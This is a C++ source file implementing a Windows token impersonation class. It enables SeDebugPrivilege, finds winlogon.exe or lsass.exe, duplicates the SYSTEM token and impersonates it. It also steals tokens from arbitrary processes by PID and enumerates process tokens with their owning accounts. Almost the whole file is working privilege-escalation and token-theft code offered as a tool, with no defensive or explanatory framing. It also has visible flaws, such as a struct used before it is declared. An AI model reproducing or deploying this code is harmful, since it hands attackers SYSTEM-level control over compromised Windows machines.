#include <windows.h>
#include <iostream>
#include <vector>
#include <string>

#pragma comment(lib, "advapi32.lib")

class TokenImpersonator {
public:
    bool ElevateToSystem() {
        // Enable SeDebugPrivilege
        if (!EnablePrivilege(SE_DEBUG_NAME)) {
            return false;
        }
        
        // Find SYSTEM process (winlogon.exe or lsass.exe)
        DWORD systemPid = FindSystemProcess();
        if (systemPid == 0) {
            return false;
        }
        
        // Open SYSTEM process
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, systemPid);
        if (!hProcess) {
            return false;
        }
        
        // Open token
        HANDLE hToken;
        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
            CloseHandle(hProcess);
            return false;
        }
        
        // Duplicate token for impersonation
        HANDLE hDupToken;
        SECURITY_ATTRIBUTES sa = { sizeof(sa) };
        
        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, 
                             TokenPrimary, &hDupToken)) {
            CloseHandle(hToken);
            CloseHandle(hProcess);
            return false;
        }
        
        // Impersonate
        BOOL result = ImpersonateLoggedOnUser(hDupToken);
        
        // Cleanup
        CloseHandle(hDupToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        
        return result;
    }
    
    bool StealTokenFromProcess(DWORD pid) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (!hProcess) return false;
        
        HANDLE hToken;
        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
            CloseHandle(hProcess);
            return false;
        }
        
        // Duplicate and impersonate
        HANDLE hDupToken;
        DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, 
                        TokenImpersonation, &hDupToken);
        
        BOOL result = SetThreadToken(NULL, hDupToken);
        
        CloseHandle(hDupToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        
        return result;
    }
    
    std::vector<ProcessToken> EnumerateTokens() {
        std::vector<ProcessToken> tokens;
        
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 pe32 = { sizeof(pe32) };
        
        if (Process32First(hSnap, &pe32)) {
            do {
                ProcessToken token;
                token.pid = pe32.th32ProcessID;
                token.name = pe32.szExeFile;
                
                // Check if we can open token
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    HANDLE hToken;
                    if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
                        DWORD dwSize = 0;
                        GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
                        
                        if (dwSize > 0) {
                            std::vector<BYTE> buffer(dwSize);
                            if (GetTokenInformation(hToken, TokenUser, buffer.data(), dwSize, &dwSize)) {
                                TOKEN_USER* pUser = (TOKEN_USER*)buffer.data();
                                // Convert SID to username
                                token.username = SidToUsername(pUser->User.Sid);
                            }
                        }
                        
                        CloseHandle(hToken);
                    }
                    CloseHandle(hProcess);
                }
                
                tokens.push_back(token);
            } while (Process32Next(hSnap, &pe32));
        }
        
        CloseHandle(hSnap);
        return tokens;
    }
    
private:
    bool EnablePrivilege(LPCWSTR privilege) {
        HANDLE hToken;
        TOKEN_PRIVILEGES tp;
        LUID luid;
        
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            return false;
        }
        
        if (!LookupPrivilegeValueW(NULL, privilege, &luid)) {
            CloseHandle(hToken);
            return false;
        }
        
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        
        BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        CloseHandle(hToken);
        
        return result;
    }
    
    DWORD FindSystemProcess() {
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 pe32 = { sizeof(pe32) };
        
        if (Process32First(hSnap, &pe32)) {
            do {
                if (_wcsicmp(pe32.szExeFile, L"winlogon.exe") == 0 ||
                    _wcsicmp(pe32.szExeFile, L"lsass.exe") == 0) {
                    CloseHandle(hSnap);
                    return pe32.th32ProcessID;
                }
            } while (Process32Next(hSnap, &pe32));
        }
        
        CloseHandle(hSnap);
        return 0;
    }
    
    std::wstring SidToUsername(PSID sid) {
        wchar_t name[256], domain[256];
        DWORD nameSize = 256, domainSize = 256;
        SID_NAME_USE use;
        
        if (LookupAccountSidW(NULL, sid, name, &nameSize, domain, &domainSize, &use)) {
            return std::wstring(domain) + L"\\" + name;
        }
        
        return L"Unknown";
    }
};

struct ProcessToken {
    DWORD pid;
    std::wstring name;
    std::wstring username;
};